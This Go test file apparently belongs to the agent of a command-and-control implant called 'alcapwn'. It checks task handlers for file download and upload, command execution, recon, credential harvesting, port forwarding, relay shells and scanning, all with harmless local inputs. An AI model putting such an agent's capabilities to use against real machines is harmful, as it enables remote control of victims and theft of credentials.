package main

import (
	"fmt"
	"os"
	"strings"
	"testing"

	"alcapwn/proto"
)

func TestTaskDownload_SmallFile(t *testing.T) {
	f, err := os.CreateTemp(t.TempDir(), "download-small-*")
	if err != nil {
		t.Fatal(err)
	}
	content := []byte("hello download test")
	if _, err := f.Write(content); err != nil {
		t.Fatal(err)
	}
	f.Close()

	task := proto.Task{
		ID:   "t1",
		Kind: proto.TaskDownload,
		Path: f.Name(),
	}
	res := executeTask(task)
	if res.Error != "" {
		t.Fatalf("small file should succeed, got error: %s", res.Error)
	}
	if string(res.Output) != string(content) {
		t.Fatalf("want %q, got %q", content, res.Output)
	}
}

func TestTaskDownload_SizeLimit(t *testing.T) {
	// Create a file larger than proto.MaxBodySize (4 MiB).
	dir := t.TempDir()
	path := dir + "/big.bin"
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	// Write MaxBodySize + 1 byte.
	size := int64(proto.MaxBodySize) + 1
	if err := f.Truncate(size); err != nil {
		t.Fatal(err)
	}
	f.Close()

	task := proto.Task{
		ID:   "t2",
		Kind: proto.TaskDownload,
		Path: path,
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("file exceeding MaxBodySize should be rejected")
	}
	expected := fmt.Sprintf("file too large: %d bytes (max %d)", size, proto.MaxBodySize)
	if res.Error != expected {
		t.Fatalf("want error %q, got %q", expected, res.Error)
	}
}

func TestTaskDownload_ExactlyMaxBodySize(t *testing.T) {
	// A file exactly MaxBodySize should succeed.
	dir := t.TempDir()
	path := dir + "/exact.bin"
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	if err := f.Truncate(int64(proto.MaxBodySize)); err != nil {
		t.Fatal(err)
	}
	f.Close()

	task := proto.Task{
		ID:   "t3",
		Kind: proto.TaskDownload,
		Path: path,
	}
	res := executeTask(task)
	if res.Error != "" {
		t.Fatalf("file exactly MaxBodySize should succeed, got error: %s", res.Error)
	}
}

func TestTaskDownload_NonexistentFile(t *testing.T) {
	task := proto.Task{
		ID:   "t4",
		Kind: proto.TaskDownload,
		Path: "/nonexistent_alcapwn_test_xyz_abc",
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("nonexistent file should return error")
	}
}

// ── TaskExec ─────────────────────────────────────────────────────────────────

func TestTaskExec_EchoCommand(t *testing.T) {
	task := proto.Task{
		ID:      "exec-1",
		Kind:    proto.TaskExec,
		Command: "echo hello-exec",
	}
	res := executeTask(task)
	if res.Error != "" {
		t.Fatalf("expected no error, got %q", res.Error)
	}
	if !strings.Contains(string(res.Output), "hello-exec") {
		t.Fatalf("want 'hello-exec' in output, got %q", res.Output)
	}
	if res.Exit != 0 {
		t.Fatalf("want exit 0, got %d", res.Exit)
	}
}

func TestTaskExec_NonZeroExit(t *testing.T) {
	task := proto.Task{
		ID:      "exec-2",
		Kind:    proto.TaskExec,
		Command: "false",
	}
	res := executeTask(task)
	// 'false' exits 1; exit code should be captured, not an error string.
	if res.Exit == 0 && res.Error == "" {
		t.Fatal("want non-zero exit or error for 'false' command")
	}
}

func TestTaskExec_CommandNotFound(t *testing.T) {
	task := proto.Task{
		ID:      "exec-3",
		Kind:    proto.TaskExec,
		Command: "nonexistent_binary_alcapwn_test_xyz",
	}
	res := executeTask(task)
	// Either res.Error is set (exec.Command fails to start) or exit code != 0.
	if res.Error == "" && res.Exit == 0 {
		t.Fatal("want error or non-zero exit for nonexistent command")
	}
}

func TestTaskExec_StderrCaptured(t *testing.T) {
	task := proto.Task{
		ID:      "exec-4",
		Kind:    proto.TaskExec,
		Command: "ls /nonexistent_alcapwn_test_xyz_dir",
	}
	res := executeTask(task)
	// stderr should be captured in Output (CombinedOutput).
	if len(res.Output) == 0 && res.Error == "" {
		t.Fatal("want stderr captured in output")
	}
}

// ── TaskUpload ───────────────────────────────────────────────────────────────

func TestTaskUpload_WriteFile(t *testing.T) {
	dir := t.TempDir()
	path := dir + "/uploaded.txt"
	content := []byte("upload content here")

	task := proto.Task{
		ID:   "upload-1",
		Kind: proto.TaskUpload,
		Path: path,
		Data: content,
	}
	res := executeTask(task)
	if res.Error != "" {
		t.Fatalf("upload should succeed, got error: %s", res.Error)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("failed to read uploaded file: %v", err)
	}
	if string(data) != string(content) {
		t.Fatalf("want %q, got %q", content, data)
	}
}

func TestTaskUpload_Permissions(t *testing.T) {
	dir := t.TempDir()
	path := dir + "/perms.txt"

	task := proto.Task{
		ID:   "upload-2",
		Kind: proto.TaskUpload,
		Path: path,
		Data: []byte("test"),
	}
	res := executeTask(task)
	if res.Error != "" {
		t.Fatalf("upload error: %s", res.Error)
	}

	fi, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	// WriteFile uses 0644 permissions.
	perm := fi.Mode().Perm()
	if perm != 0644 {
		t.Fatalf("want file mode 0644, got %04o", perm)
	}
}

func TestTaskUpload_BadPath(t *testing.T) {
	task := proto.Task{
		ID:   "upload-3",
		Kind: proto.TaskUpload,
		Path: "/nonexistent_dir_alcapwn/somefile",
		Data: []byte("test"),
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("upload to nonexistent directory should fail")
	}
}

// ── TaskRecon ────────────────────────────────────────────────────────────────

func TestTaskRecon_ReturnsOutput(t *testing.T) {
	task := proto.Task{
		ID:   "recon-1",
		Kind: proto.TaskRecon,
	}
	res := executeTask(task)
	if res.Error != "" {
		t.Fatalf("recon should not error: %s", res.Error)
	}
	if len(res.Output) == 0 {
		t.Fatal("recon should return non-empty output")
	}
}

// ── TaskCreds ────────────────────────────────────────────────────────────────

func TestTaskCreds_DoesNotPanic(t *testing.T) {
	task := proto.Task{
		ID:   "creds-1",
		Kind: proto.TaskCreds,
	}
	// Must not panic, even if credentials are empty.
	res := executeTask(task)
	// Output may be empty on some systems, but the call should succeed.
	if res.Error != "" {
		t.Fatalf("creds should not error: %s", res.Error)
	}
}

// ── Unknown task kind ────────────────────────────────────────────────────────

func TestTaskUnknown_ReturnsError(t *testing.T) {
	task := proto.Task{
		ID:   "unknown-1",
		Kind: "bogus_kind",
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("unknown task kind should return error")
	}
}

// ── TaskForward ──────────────────────────────────────────────────────────────

func TestTaskForward_MissingTarget(t *testing.T) {
	task := proto.Task{
		ID:    "fwd-1",
		Kind:  proto.TaskForward,
		Relay: "127.0.0.1:9999",
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("forward without target should fail")
	}
}

func TestTaskForward_MissingRelay(t *testing.T) {
	task := proto.Task{
		ID:     "fwd-2",
		Kind:   proto.TaskForward,
		Target: "127.0.0.1:8080",
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("forward without relay should fail")
	}
}

// ── TaskShell ────────────────────────────────────────────────────────────────

func TestTaskShell_MissingRelay(t *testing.T) {
	task := proto.Task{
		ID:   "shell-1",
		Kind: proto.TaskShell,
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("shell without relay should fail")
	}
}

// ── TaskScan missing target ──────────────────────────────────────────────────

func TestTaskScan_MissingTarget(t *testing.T) {
	task := proto.Task{
		ID:   "scan-1",
		Kind: proto.TaskScan,
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("scan without target should fail")
	}
}

// ── TaskSOCKS5 (unused) ─────────────────────────────────────────────────────

func TestTaskSOCKS5_ReturnsError(t *testing.T) {
	task := proto.Task{
		ID:   "socks-1",
		Kind: proto.TaskSOCKS5,
	}
	res := executeTask(task)
	if res.Error == "" {
		t.Fatal("socks5 task should return error")
	}
}

// ── Helper function tests ────────────────────────────────────────────────────

func TestParseInt_Valid(t *testing.T) {
	cases := []struct {
		s    string
		def  int
		want int
	}{
		{"60", 10, 60},
		{"1", 10, 1},
		{"0", 10, 10},  // 0 is not > 0, falls to default
		{"-1", 10, 10}, // negative not > 0
		{"", 10, 10},
		{"abc", 10, 10},
	}
	for _, c := range cases {
		got := parseInt(c.s, c.def)
		if got != c.want {
			t.Errorf("parseInt(%q, %d) = %d, want %d", c.s, c.def, got, c.want)
		}
	}
}

func TestBuildTransport_TCP(t *testing.T) {
	transport = "tcp"
	tr := buildTransport(60, 20)
	if _, ok := tr.(*TCPTransport); !ok {
		t.Fatalf("want *TCPTransport, got %T", tr)
	}
}

func TestBuildTransport_HTTP(t *testing.T) {
	old := transport
	transport = "http"
	defer func() { transport = old }()
	tr := buildTransport(60, 20)
	if _, ok := tr.(*HTTPTransport); !ok {
		t.Fatalf("want *HTTPTransport, got %T", tr)
	}
}

func TestBuildHello_Fields(t *testing.T) {
	h := buildHello()
	if h.Version != agentVersion {
		t.Fatalf("want version %q, got %q", agentVersion, h.Version)
	}
	if h.OS == "" {
		t.Fatal("want non-empty OS")
	}
	if h.Arch == "" {
		t.Fatal("want non-empty Arch")
	}
	if h.MachineID == "" {
		t.Fatal("want non-empty MachineID")
	}
}

func TestDetectShell_ReturnsNonEmpty(t *testing.T) {
	s := detectShell()
	// On most systems a shell should be found.
	if s == "" {
		t.Skip("no shell found on this system")
	}
	// The returned path's first token should exist.
	parts := strings.Fields(s)
	if _, err := os.Stat(parts[0]); err != nil {
		t.Fatalf("shell %q does not exist: %v", parts[0], err)
	}
}
